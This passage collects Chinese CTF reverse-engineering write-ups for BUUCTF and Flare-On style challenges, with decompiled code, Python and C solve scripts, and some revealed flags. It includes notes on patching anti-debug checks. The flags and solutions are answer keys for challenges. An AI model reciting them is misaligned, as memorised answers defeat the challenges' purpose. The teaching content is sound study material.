1LL, v16); } else { v20 = \u0026amp;unk_4AC9C0; v21 = \u0026amp;off_4EA540; fmt_Fprintln( v0, v1, v11, (unsigned int)\u0026amp;go_itab__os_File_io_Writer, v7, v8, (__int64)\u0026amp;go_itab__os_File_io_Writer, os_Stdout, (__int64)\u0026amp;v20, 1LL, 1LL, v16); } } 翻aFlagHelloWorld就能看到flag{hello_world_gogogo}\n这道题最有用的是让我装了idaGolangHelper\n[WUSTCTF2020]level3 main函数\nint __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // rax char v5; // [rsp+Fh] [rbp-41h] char v6[56]; // [rsp+10h] [rbp-40h] BYREF unsigned __int64 v7; // [rsp+48h] [rbp-8h] v7 = __readfsqword(0x28u); printf(\u0026quot;Try my base64 program?.....\\n\u0026gt;\u0026quot;); __isoc99_scanf(\u0026quot;%20s\u0026quot;, v6); v5 = time(0LL); srand(v5); if ( (rand() \u0026amp; 1) != 0 ) { v3 = base64_encode(v6); puts(v3); puts(\u0026quot;Is there something wrong?\u0026quot;); } else { puts(\u0026quot;Sorry I think it's not prepared yet....\u0026quot;); puts(\u0026quot;And I get a strange string from my program which is different from the standard base64:\u0026quot;); puts(\u0026quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==\u0026quot;); puts(\u0026quot;What's wrong??\u0026quot;); } return 0; } 可以看出最终flag是这段字符串d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==base64解密得到的\n但标准base64解密出来是乱码，说明对base64做了手脚、\n其实是在start函数中藏了一个换表的操作\n__int64 O_OLookAtYou() { __int64 result; // rax char v1; // [rsp+1h] [rbp-5h] int i; // [rsp+2h] [rbp-4h] for ( i = 0; i \u0026lt;= 9; ++i ) { v1 = base64_table[i]; base64_table[i] = base64_table[19 - i]; result = 19 - i; base64_table[result] = v1; } return result; } 可以计算拿到新表，但更好的方法是直接动调就能拿到新表\n写脚本拿flag\nimport base64 new_table = \u0026quot;TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026quot; standard_table = \u0026quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026quot; enc = \u0026quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==\u0026quot; table = str.maketrans(standard_table, new_table) print(base64.b64decode(enc.translate(table))) #output：b'wctf2020{Base64_is_the_start_of_reverse}' [FlareOn4]IgniteMe main函数 void __thiscall __noreturn start(char *Format) { DWORD NumberOfBytesWritten; // [esp+0h] [ebp-4h] BYREF NumberOfBytesWritten = 0; hFile = GetStdHandle(0xFFFFFFF6); dword_403074 = GetStdHandle(0xFFFFFFF5); WriteFile(dword_403074, aG1v3M3T3hFl4g, 0x13u, \u0026amp;NumberOfBytesWritten, 0); Scanf((const char *const)NumberOfBytesWritten); if ( check() ) WriteFile(dword_403074, aG00dJ0b, 0xAu, \u0026amp;NumberOfBytesWritten, 0); else WriteFile(dword_403074, aN0tT00H0tRWe7r, 0x24u, \u0026amp;NumberOfBytesWritten, 0); ExitProcess(0); } 主要内容在check函数 int sub_401050() { int v1; // [esp+0h] [ebp-Ch] int i; // [esp+4h] [ebp-8h] unsigned int j; // [esp+4h] [ebp-8h] char v4; // [esp+Bh] [ebp-1h] v1 = strlen((int)input); v4 = key(); for ( i = v1 - 1; i \u0026gt;= 0; --i ) { byte_403180[i] = v4 ^ input[i]; v4 = input[i]; } for ( j = 0; j \u0026lt; 0x27; ++j ) { if ( byte_403180[j] != (unsigned __int8)enc[j] ) return 0; } return 1; } 异或拿flag enc = [0x0D, 0x26, 0x49, 0x45, 0x2A, 0x17, 0x78, 0x44, 0x2B, 0x6C, 0x5D, 0x5E, 0x45, 0x12, 0x2F, 0x17, 0x2B, 0x44, 0x6F, 0x6E, 0x56, 0x09, 0x5F, 0x45, 0x47, 0x73, 0x26, 0x0A, 0x0D, 0x13, 0x17, 0x48, 0x42, 0x01, 0x40, 0x4D, 0x0C, 0x02, 0x69, 0x00] key = 4 flag = [0] * 40 for i in range(38, -1, -1): flag[i] = enc[i] ^ key key = flag[i] for i in flag: print(chr(i), end = \u0026quot;\u0026quot;) #output:R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com [FlareOn6]Overlong 由题目结合数组猜测数据没有打印完全\n把代码dump下来，循环次数加大，运行即可拿flag\n#include\u0026lt;stdio.h\u0026gt; int cal(char *c, char *byte){ int v3; char v4; if ( (int)(unsigned char)*byte \u0026gt;\u0026gt; 3 == 30 ){ v4 = byte[3] \u0026amp; 0x3F | ((byte[2] \u0026amp; 0x3F) \u0026lt;\u0026lt; 6); v3 = 4; } else if ( (int)(unsigned char)*byte \u0026gt;\u0026gt; 4 == 14 ){ v4 = byte[2] \u0026amp; 0x3F | ((byte[1] \u0026amp; 0x3F) \u0026lt;\u0026lt; 6); v3 = 3; } else if ( (int)(unsigned char)*byte \u0026gt;\u0026gt; 5 == 6 ){ v4 = byte[1] \u0026amp; 0x3F | ((*byte \u0026amp; 0x1F) \u0026lt;\u0026lt; 6); v3 = 2; } else{ v4 = *byte; v3 = 1; } *c = v4; return v3; } int main(){ unsigned char bytecode[176] = { 0xE0, 0x81, 0x89, 0xC0, 0xA0, 0xC1, 0xAE, 0xE0, 0x81, 0xA5, 0xC1, 0xB6, 0xF0, 0x80, 0x81, 0xA5, 0xE0, 0x81, 0xB2, 0xF0, 0x80, 0x80, 0xA0, 0xE0, 0x81, 0xA2, 0x72, 0x6F, 0xC1, 0xAB, 0x65, 0xE0, 0x80, 0xA0, 0xE0, 0x81, 0xB4, 0xE0, 0x81, 0xA8, 0xC1, 0xA5, 0x20, 0xC1, 0xA5, 0xE0, 0x81, 0xAE, 0x63, 0xC1, 0xAF, 0xE0, 0x81, 0xA4, 0xF0, 0x80, 0x81, 0xA9, 0x6E, 0xC1, 0xA7, 0xC0, 0xBA, 0x20, 0x49, 0xF0, 0x80, 0x81, 0x9F, 0xC1, 0xA1, 0xC1, 0x9F, 0xC1, 0x8D, 0xE0, 0x81, 0x9F, 0xC1, 0xB4, 0xF0, 0x80, 0x81, 0x9F, 0xF0, 0x80, 0x81, 0xA8, 0xC1, 0x9F, 0xF0, 0x80, 0x81, 0xA5, 0xE0, 0x81, 0x9F, 0xC1, 0xA5, 0xE0, 0x81, 0x9F, 0xF0, 0x80, 0x81, 0xAE, 0xC1, 0x9F, 0xF0, 0x80, 0x81, 0x83, 0xC1, 0x9F, 0xE0, 0x81, 0xAF, 0xE0, 0x81, 0x9F, 0xC1, 0x84, 0x5F, 0xE0, 0x81, 0xA9, 0xF0, 0x80, 0x81, 0x9F, 0x6E, 0xE0, 0x81, 0x9F, 0xE0, 0x81, 0xA7, 0xE0, 0x81, 0x80, 0xF0, 0x80, 0x81, 0xA6, 0xF0, 0x80, 0x81, 0xAC, 0xE0, 0x81, 0xA1, 0xC1, 0xB2, 0xC1, 0xA5, 0xF0, 0x80, 0x80, 0xAD, 0xF0, 0x80, 0x81, 0xAF, 0x6E, 0xC0, 0xAE, 0xF0, 0x80, 0x81, 0xA3, 0x6F, 0xF0, 0x80, 0x81, 0xAD, 0x00 }; char *byte = bytecode; char c; char flag[100]; for(int i = 0; i \u0026lt;= 100; i++){ byte += cal(\u0026amp;c, byte); putchar(c); } } //output：I never broke the encoding: I_a_M_t_h_e_e_n_C_o_D_i_n_g@flare-on.com [FlareOn3]Challenge1 main函数 int __cdecl main(int argc, const char **argv, const char **envp) { unsigned __int8 Buffer[128]; // [esp+0h] [ebp-94h] BYREF char *Str1; // [esp+80h] [ebp-14h] char *Str2; // [esp+84h] [ebp-10h] HANDLE v7; // [esp+88h] [ebp-Ch] HANDLE hFile; // [esp+8Ch] [ebp-8h] DWORD NumberOfBytesWritten; // [esp+90h] [ebp-4h] BYREF hFile = GetStdHandle(0xFFFFFFF5); v7 = GetStdHandle(0xFFFFFFF6); Str2 = \u0026quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q\u0026quot;; WriteFile(hFile, \u0026quot;Enter password:\\r\\n\u0026quot;, 0x12u, \u0026amp;NumberOfBytesWritten, 0); ReadFile(v7, Buffer, 0x80u, \u0026amp;NumberOfBytesWritten, 0); Str1 = sub_401260(Buffer, NumberOfBytesWritten - 2); if ( !strcmp(Str1, Str2) ) WriteFile(hFile, \u0026quot;Correct!\\r\\n\u0026quot;, 0xBu, \u0026amp;NumberOfBytesWritten, 0); else WriteFile(hFile, \u0026quot;Wrong password\\r\\n\u0026quot;, 0x11u, \u0026amp;NumberOfBytesWritten, 0); return 0; } sub_401260函数 char *__cdecl sub_401260(unsigned __int8 *input, unsigned int cnt) { int v3; // [esp+Ch] [ebp-24h] int v4; // [esp+10h] [ebp-20h] int v5; // [esp+14h] [ebp-1Ch] int i; // [esp+1Ch] [ebp-14h] unsigned int v7; // [esp+20h] [ebp-10h] char *v8; // [esp+24h] [ebp-Ch] int v9; // [esp+28h] [ebp-8h] int v10; // [esp+28h] [ebp-8h] unsigned int v11; // [esp+2Ch] [ebp-4h] v8 = (char *)malloc(4 * ((cnt + 2) / 3) + 1); if ( !v8 ) return 0; v11 = 0; v9 = 0; while ( v11 \u0026lt; cnt ) { v5 = input[v11]; if ( ++v11 \u0026gt;= cnt ) v4 = 0; else v4 = input[v11++]; if ( v11 \u0026gt;= cnt ) v3 = 0; else v3 = input[v11++]; v7 = v3 + (v5 \u0026lt;\u0026lt; 16) + (v4 \u0026lt;\u0026lt; 8); v8[v9] = aZyxabcdefghijk[(v7 \u0026gt;\u0026gt; 18) \u0026amp; 0x3F]; v10 = v9 + 1; v8[v10] = aZyxabcdefghijk[(v7 \u0026gt;\u0026gt; 12) \u0026amp; 0x3F]; v8[++v10] = aZyxabcdefghijk[(v7 \u0026gt;\u0026gt; 6) \u0026amp; 0x3F]; v8[++v10] = aZyxabcdefghijk[v3 \u0026amp; 0x3F]; v9 = v10 + 1; } for ( i = 0; i \u0026lt; *(_DWORD *)\u0026amp;aZyxabcdefghijk[4 * (cnt % 3) + 64]; ++i ) v8[4 * ((cnt + 2) / 3) - i - 1] = 61; v8[4 * ((cnt + 2) / 3)] = 0; return v8; } 看到下面的aZyxabcdefghijk就感觉有点base64换表那味，试了一下，还真是\n脚本\nimport base64 standard_table = \u0026quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026quot; new_table = \u0026quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/\u0026quot; table = str.maketrans(new_table, standard_table) enc = \u0026quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q\u0026quot; print(base64.b64decode(enc.translate(table))) #sh00ting_phish_in_a_barrel@flare-on.com [ACTF新生赛2020]Oruga 新颖的迷宫题\n逻辑函数\nbool __fastcall sub_78A(char *input) { int v2; // [rsp+Ch] [rbp-Ch] int v3; // [rsp+10h] [rbp-8h] int head; // [rsp+14h] [rbp-4h] v2 = 0; v3 = 5; head = 0; while ( byte_201020[v2] != '!' ) { v2 -= head; if ( input[v3] != 'W' || head == -16 ) { if ( input[v3] != 'E' || head == 1 ) { if ( input[v3] != 'M' || head == 16 ) { if ( input[v3] != 'J' || head == -1 ) return 0; head = -1; } else { head = 16; } } else { head = 1; } } else { head = -16; } ++v3; while ( !byte_201020[v2] ) { if ( head == -1 \u0026amp;\u0026amp; (v2 \u0026amp; 0xF) == 0 ) return 0; if ( head == 1 \u0026amp;\u0026amp; v2 % 16 == 15 ) return 0; if ( head == 16 \u0026amp;\u0026amp; (unsigned int)(v2 - 240) \u0026lt;= 0xF ) return 0; if ( head == -16 \u0026amp;\u0026amp; (unsigned int)(v2 + 15) \u0026lt;= 0x1E ) return 0; v2 += head; } } return input[v3] == '}'; } 只要当前字符为0,就朝一个方向一直走下去，越界就寄了\n手动走一下\nflag：actf{MEWEMEWJMEWJM}\n[Zer0pts2020]easy strcmp 出题人在main函数之前修改了strcmp函数\n动调找到修改后的代码\n__int64 __fastcall sub_559B072006EA(char *a1, __int64 a2) { int i; // [rsp+18h] [rbp-8h] int v4; // [rsp+18h] [rbp-8h] int j; // [rsp+1Ch] [rbp-4h] for ( i = 0; a1[i]; ++i ) ; v4 = (i \u0026gt;\u0026gt; 3) + 1; for ( j = 0; j \u0026lt; v4; ++j ) *(_QWORD *)\u0026amp;a1[8 * j] -= qword_559B07401060[j]; return off_559B07401090(a1, a2); } 其实是把input减去qword_559B07401060与zer0pts{********CENSORED********}比较\n刚开始想逐位解密，但发现中间8位有问题，应该是有进位的原因\n还是得强转成qword运算，但实测这么算出来最后会多一位*，删掉即可\n#include\u0026lt;stdio.h\u0026gt; int main(){ unsigned long long key[] = {0x410A4335494A0942, 0x0B0EF2F50BE619F0, 0x4F0A3A064A35282B}; char en_flag[] = \u0026quot;********CENSORED********\u0026quot;; char flag[] = \u0026quot;\u0026quot;; for(int i = 0; i \u0026lt; 3; i++){ *((long long *)flag + i) = *((long long *)en_flag + i) + key[i]; } puts(flag); //l3ts_m4k3_4_DETOUR_t0d4y* } flag{l3ts_m4k3_4_DETOUR_t0d4y}\n[ACTF新生赛2020]Universe_final_answer main函数\n__int64 __fastcall main(int a1, char **a2, char **a3) { char v4[32]; // [rsp+0h] [rbp-A8h] BYREF char input[104]; // [rsp+20h] [rbp-88h] BYREF unsigned __int64 v6; // [rsp+88h] [rbp-20h] v6 = __readfsqword(0x28u); __printf_chk(1LL, \u0026quot;Please give me the key string:\u0026quot;, a3); scanf(\u0026quot;%s\u0026quot;, input); if ( sub_860(input) ) { sub_C50(input, v4); __printf_chk(1LL, \u0026quot;Judgement pass! flag is actf{%s_%s}\\n\u0026quot;, input); } else { puts(\u0026quot;False key!\u0026quot;); } return 0LL; } 验证函数 bool __fastcall sub_860(char *a1) { int v1; // ecx int v2; // esi int v3; // edx int v4; // er9 int v5; // er11 int v6; // ebp int v7; // ebx int v8; // er8 int v9; // er10 bool result; // al int v11; // [rsp+0h] [rbp-38h] v1 = a1[1]; v2 = *a1; v3 = a1[2]; v4 = a1[3]; v5 = a1[4]; v6 = a1[6]; v7 = a1[5]; v8 = a1[7]; v9 = a1[8]; result = 0; if ( -85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613 ) { v11 = a1[9]; if ( 30 * v11 + -70 * v9 + -122 * v6 + -81 * v7 + -66 * v5 + -115 * v4 + -41 * v3 + -86 * v1 - 15 * v2 - 30 * v8 == -54400 \u0026amp;\u0026amp; -103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - (v6 \u0026lt;\u0026lt; 6) - 120 * v9 == -10283 \u0026amp;\u0026amp; 71 * v6 + (v7 \u0026lt;\u0026lt; 7) + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 == 22855 \u0026amp;\u0026amp; 5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 == -2944 \u0026amp;\u0026amp; -54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 == -2222 \u0026amp;\u0026amp; -83 * v11 + -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 == -13258 \u0026amp;\u0026amp; 81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 == -1559 \u0026amp;\u0026amp; 101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 == 6308 ) { result = 99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 == -1697; } } return result; } 直接上z3 from z3 import * v1 = Int('v1') v2 = Int('v2') v3 = Int('v3') v4 = Int('v4') v5 = Int('v5') v6 = Int('v6') v7 = Int('v7') v8 = Int('v8') v9 = Int('v9') v10 = Int('v10') v11 = Int('v11') s = z3.Solver() s.add(-85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613) s.add(30 * v11 + -70 * v9 + -122 * v6 + -81 * v7 + -66 * v5 + -115 * v4 + -41 * v3 + -86 * v1 - 15 * v2 - 30 * v8 == -54400) s.add(-103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - (v6 * 64) - 120 * v9 == -10283) s.add(71 * v6 + (v7 * 128) + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 == 22855) s.add(5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 == -2944) s.add(-54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 == -2222) s.add(-83 * v11 + -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 == -13258) s.add(81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 == -1559) s.add(101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 == 6308) s.add(99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 == -1697) s.check() print(s.model()) ida里的数据顺序很乱，手动调整一下 v = [0] * 10 v[1] = 48 v[6] = 95 v[0] = 70 v[3] = 82 v[9] = 64 v[2] = 117 v[4] = 84 v[5] = 121 v[8] = 119 v[7] = 55 for i in v: print(chr(i), end=\u0026quot;\u0026quot;) #F0uRTy_7w@ 拿到key，运行程序输入key拿到flag\nCrack me 集合了各种反调试的一道题\nmain函数\nint wmain() { FILE *v0; // eax FILE *v1; // eax char v3; // [esp+3h] [ebp-405h] char v4; // [esp+4h] [ebp-404h] BYREF char v5[255]; // [esp+5h] [ebp-403h] BYREF char Format; // [esp+104h] [ebp-304h] BYREF char v7[255]; // [esp+105h] [ebp-303h] BYREF char passwd; // [esp+204h] [ebp-204h] BYREF char v9[255]; // [esp+205h] [ebp-203h] BYREF char user; // [esp+304h] [ebp-104h] BYREF char v11[255]; // [esp+305h] [ebp-103h] BYREF printf(\u0026quot;Come one! Crack Me~~~\\n\u0026quot;); user = 0; memset(v11, 0, sizeof(v11)); passwd = 0; memset(v9, 0, sizeof(v9)); while ( 1 ) { do { do { printf(\u0026quot;user(6-16 letters or numbers):\u0026quot;); scanf(\u0026quot;%s\u0026quot;, \u0026amp;user); v0 = (FILE *)sub_CD24BE(); fflush(v0); } while ( !(unsigned __int8)sub_CD1000(\u0026amp;user) ); printf(\u0026quot;password(6-16 letters or numbers):\u0026quot;); scanf(\u0026quot;%s\u0026quot;, \u0026amp;passwd); v1 = (FILE *)sub_CD24BE(); fflush(v1); } while ( !(unsigned __int8)sub_CD1000(\u0026amp;passwd) ); sub_CD1090(\u0026amp;user); Format = 0; memset(v7, 0, sizeof(v7)); v4 = 0; memset(v5, 0, sizeof(v5)); v3 = ((int (__cdecl *)(char *, char *))loc_CD11A0)(\u0026amp;Format, \u0026amp;v4); if ( sub_CD1830((int)\u0026amp;user, \u0026amp;passwd) ) { if ( v3 ) break; } printf(\u0026amp;v4); } printf(\u0026amp;Format); return 0; } 先后输入用户名（welcomebeijing）和密码，每次输入过后有一个sub_CD24BE函数，动调发现对user和passwd都没影响，跳过即可\n主要加密/判断在sub_CD1830函数\nbool __usercall sub_CD1830@\u0026lt;al\u0026gt;(int a1@\u0026lt;ebx\u0026gt;, char *user, const char *passwd) { int v4; // [esp+18h] [ebp-22Ch] int v5; // [esp+1Ch] [ebp-228h] int j; // [esp+28h] [ebp-21Ch] unsigned int i; // [esp+30h] [ebp-214h] char v8; // [esp+36h] [ebp-20Eh] char v9; // [esp+37h] [ebp-20Dh] char v10; // [esp+38h] [ebp-20Ch] unsigned __int8 v11; // [esp+39h] [ebp-20Bh] unsigned __int8 v12; // [esp+3Ah] [ebp-20Ah] char v13; // [esp+3Bh] [ebp-209h] int check; // [esp+3Ch] [ebp-208h] BYREF char v15; // [esp+40h] [ebp-204h] BYREF char v16[255]; // [esp+41h] [ebp-203h] BYREF _BYTE v17[256]; // [esp+140h] [ebp-104h] BYREF v5 = 0; j = 0; v12 = 0; v11 = 0; v17[0] = 0; memset(\u0026amp;v17[1], 0, 0xFFu); v15 = 0; memset(v16, 0, sizeof(v16)); v10 = 0; i = 0; v4 = 0; while ( i \u0026lt; strlen(passwd) ) { if ( isdigit(passwd[i]) ) { v9 = passwd[i] - 48; } else if ( isxdigit(passwd[i]) ) { if ( *((_DWORD *)NtCurrentPeb()-\u0026gt;SubSystemData + 3) == 2 )// 反调 passwd[i] = 34; v9 = (passwd[i] | 0x20) - 87; } else { v9 = ((passwd[i] | 0x20) - 97) % 6 + 10; } __rdtsc(); __rdtsc(); v10 = v9 + 16 * v10; if ( !((int)(i + 1) % 2) ) { *(\u0026amp;v15 + v4++) = v10; a1 = v4; v10 = 0; } ++i; } while ( j \u0026lt; 8 ) { v11 += byte_CE6050[++v12]; v13 = byte_CE6050[v12]; v8 = byte_CE6050[v11]; byte_CE6050[v11] = v13; byte_CE6050[v12] = v8; if ( ((int)NtCurrentPeb()-\u0026gt;UnicodeCaseTableData \u0026amp; 0x70) == 0 )// 反调 v13 = v11 + v12; v17[j] = byte_CE6050[(unsigned __int8)(v8 + v13)] ^ *(\u0026amp;v15 + v5); if ( !(unsigned __int8)*(_DWORD *)\u0026amp;NtCurrentPeb()-\u0026gt;BeingDebugged )// 反调 { v11 = -83; v12 = 43; } sub_CD1710((int)v17, user, j++); v5 = j; if ( j \u0026gt;= (unsigned int)(\u0026amp;v15 + strlen(\u0026amp;v15) + 1 - v16) ) v5 = 0; } check = 0; sub_CD1470(a1, v17, \u0026amp;check); return check == 0xAB94; } 从上到下总共三次反调试操作，上面已经是patch过的版本（对应汇编jz与jnz互改）\n上面一个while循环实现了从字符串数据中获得原本字符值，具体可动调试试\n下面加密部分大致可分为3块，下面倒着分析\n第一块\n整个函数最后返回验证的是check值，而check值应由sub_CD1470获得\nsub_CD1470函数\nvoid __usercall sub_CD1470(int a1@\u0026lt;ebx\u0026gt;, _BYTE *v17, _DWORD *check) { char v5; // al if ( *v17 != 'd' ) *check ^= 3u; else *check |= 4u; if ( v17[1] != 'b' ) { *check \u0026amp;= 0x61u; _EAX = (_DWORD *)*check; } else { _EAX = check; *check |= 20u; } __asm { aam } if ( v17[2] != 'a' ) *check \u0026amp;= 0xAu; else *check |= 0x84u; if ( v17[3] != 'p' ) *check \u0026gt;\u0026gt;= 7; else *check |= 0x114u; if ( v17[4] != 'p' ) *check *= 2; else *check |= 0x380u; if ( *((_DWORD *)NtCurrentPeb()-\u0026gt;SubSystemData + 3) != 2 )// 反调 { if ( v17[5] != 'f' ) *check |= 0x21u; else *check |= 0x2DCu; } if ( v17[5] != 's' ) { v5 = (char)check; *check ^= 0x1ADu; } else { *check |= 0xA04u; v5 = (char)check; } _AL = v5 - (~(a1 \u0026gt;\u0026gt; 5) - 1); __asm { daa } if ( v17[6] != 'e' ) *check |= 0x4Au; else *check |= 0x2310u; if ( v17[7] != 'c' ) *check \u0026amp;= 0x3A3u; else *check |= 0x8A10u; } 可见有意义字符串dbappsec，把check异或上相应的值正好是验证所需的0xab94，由此可得到v17的值\n第二块\n倒退上去是sub_CD1710函数\nvoid __cdecl sub_CD1710(int a1, const char *a2, signed int a3) { signed int v3; // [esp+4h] [ebp-58h] struct _STARTUPINFOW StartupInfo; // [esp+14h] [ebp-48h] BYREF memset(\u0026amp;StartupInfo, 0, sizeof(StartupInfo)); StartupInfo.cb = 68; GetStartupInfoW(\u0026amp;StartupInfo); v3 = strlen(a2); if ( !StartupInfo.dwX \u0026amp;\u0026amp; !StartupInfo.dwY \u0026amp;\u0026amp; !StartupInfo.dwXCountChars \u0026amp;\u0026amp; !StartupInfo.dwYCountChars \u0026amp;\u0026amp; !StartupInfo.dwFillAttribute \u0026amp;\u0026amp; !StartupInfo.dwXSize \u0026amp;\u0026amp; !StartupInfo.dwYSize ) { if ( a3 \u0026lt;= v3 ) *(_BYTE *)(a3 + a1) ^= a2[a3]; else *(_BYTE *)(a3 + a1) += byte_CE6050[v3 + a3] \u0026amp; a2[v3]; } } 首先下面第二个if else中的else一定不会被执行，因为a3不可能大于v3，具体依赖参数分析\n第一个if内的条件又是个反调（（\n参考简单反调试和花指令 | BMooS\nBOOL CheckDebug() { STARTUPINFO si; GetStartupInfo(\u0026amp;si); if (si.dwFlags!=1 || si.dwX!=0 || si.dwY!=0 || si.dwXSize!=0 || si.dwYSize!=0 || si.dwXCountChars!=0 || si.dwYCountChars!=0 || si.dwFillAttribute!=0) { return TRUE; } else { return FALSE; } } 按说题目给的if判断应该是正常情况下（不在调试）满足if条件，进行异或\n但这却是问题所在，要得到buu平台上的flag不能进这个异或，是buu出了问题？还是有什么更大的坑？暂时不得而知\n第三块\nv11 += byte_CE6050[++v12]; v13 = byte_CE6050[v12]; v8 = byte_CE6050[v11]; byte_CE6050[v11] = v13; byte_CE6050[v12] = v8; if ( ((int)NtCurrentPeb()-\u0026gt;UnicodeCaseTableData \u0026amp; 0x70) == 0 )// 反调 v13 = v11 + v12; v17[j] = byte_CE6050[(unsigned __int8)(v8 + v13)] ^ *(\u0026amp;v15 + v5); 由以上两步拿到了v17的值，这一步是要得到v15的值\n如何得到byte_CE6050[(unsigned __int8)(v8 + v13)]的值是关键\nunsigned __int8的强制类型转换确保数组下标在0-255（8位）\n可行的方案理论上有两种\n动调到循环开始dump下来byte_CE6050的值，然后把整个代码dump下来跑一遍，但由于担心在我没注意的地方byte_CE6050被修改，我选择了第二种方法\n纯动调取值，这里遇到的麻烦是ida里调试的时候无法直接查看表达式的值，需要自己去找比较麻烦，但能确保数据正确\n最后得到的8个值key = [0x2a,0xd7,0x92,0xe9,0x53,0xe2,0xc4,0xcd]\n脚本\nfrom hashlib import md5 user = \u0026quot;welcomebeijing\u0026quot; v17 = \u0026quot;dbappsec\u0026quot; passwd = \u0026quot;\u0026quot; v = [0] * 8 #for i in range(8): //这就是上面所说第二步的问题 # v[i] = ord(v17[i]) ^ ord(user[i]) key = [0x2a,0xd7,0x92,0xe9,0x53,0xe2,0xc4,0xcd] for i in range(8): passwd += (hex(key[i] ^ ord(v17[i])).replace(\u0026quot;0x\u0026quot;,\u0026quot;\u0026quot;)) print(passwd) md5 = md5() md5.update(passwd.encode(\u0026quot;utf-8\u0026quot;)) print(md5.hexdigest()) 不加第二步时输出buu平台可过的flag{d2be2981b84f2a905669995873d6a36c}\n特殊的base64 main函数\nint __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rax __int64 v4; // rax char v6[16]; // [rsp+20h] [rbp-60h] BYREF char v7[16]; // [rsp+30h] [rbp-50h] BYREF char input[15]; // [rsp+40h] [rbp-40h] BYREF char v9; // [rsp+4Fh] [rbp-31h] BYREF char v10[32]; // [rsp+50h] [rbp-30h] BYREF _main(argc, argv, envp); std::string::string((std::string *)input); std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v9); std::string::string(v7, \u0026quot;mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==\u0026quot;, \u0026amp;v9); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v9); v3 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(refptr__ZSt4cout, \u0026quot;Please input your flag!!!!\u0026quot;); std::ostream::operator\u0026lt;\u0026lt;(v3, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_); std::operator\u0026gt;\u0026gt;\u0026lt;char\u0026gt;(refptr__ZSt3cin, (std::string *)input); std::string::string((std::string *)v10, (const std::string *)input); base64Encode(v6, v10); std::string::~string((std::string *)v10); if ( (unsigned __int8)std::operator==\u0026lt;char\u0026gt;(v6, v7) ) v4 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(refptr__ZSt4cout, \u0026quot;The flag is right!!!!!!!!!\u0026quot;); else v4 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(refptr__ZSt4cout, \u0026quot;This is a wrong flag!!!!!!!!\u0026quot;); std::ostream::operator\u0026lt;\u0026lt;(v4, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_); std::string::~string((std::string *)v6); std::string::~string((std::string *)v7); std::string::~string((std::string *)input); return 0; } 还是base64换表，直接上脚本吧 import base64 standard_table = 